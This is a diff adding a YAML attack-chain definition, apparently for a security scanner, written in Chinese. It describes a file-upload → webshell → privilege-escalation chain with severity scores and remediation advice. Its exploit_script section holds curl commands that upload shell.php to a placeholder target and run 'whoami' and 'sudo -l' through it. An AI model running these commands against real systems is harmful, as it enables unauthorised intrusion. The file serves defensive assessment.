@@ -1,0 +1,43 @@
+id: CHAIN-006
+name: "文件上传 → WebShell → 权限提升"
+severity: CRITICAL
+cvss: 9.5
+epss: 0.75
+
+steps:
+  - step: 1
+    name: "文件上传漏洞"
+    rule: unrestricted_upload
+    description: "允许上传任意文件类型"
+    condition: "无文件类型/内容验证"
+
+  - step: 2
+    name: "WebShell植入"
+    rule: webshell
+    description: "上传PHP/JSP webshell"
+    condition: "可上传 .php/.jsp/.asp 文件"
+
+  - step: 3
+    name: "权限提升"
+    rule: privilege_escalation
+    description: "通过WebShell提权"
+    condition: "执行系统命令获取更高权限"
+
+exploit_script: |
+  # Step 1: 上传webshell
+  curl -F "file=@shell.php" https://target.com/upload
+
+  # Step 2: 执行命令
+  curl "https://target.com/uploads/shell.php?cmd=whoami"
+
+  # Step 3: 提权
+  curl "https://target.com/uploads/shell.php?cmd=sudo -l"
+
+remediation:
+  priority: P0
+  effort: "3小时"
+  suggestions:
+    - "验证文件类型(扩展名+MIME+魔数)"
+    - "上传目录禁止执行权限"
+    - "文件重命名，存储在非web目录"
+    - "使用CDN/OSS存储用户上传"
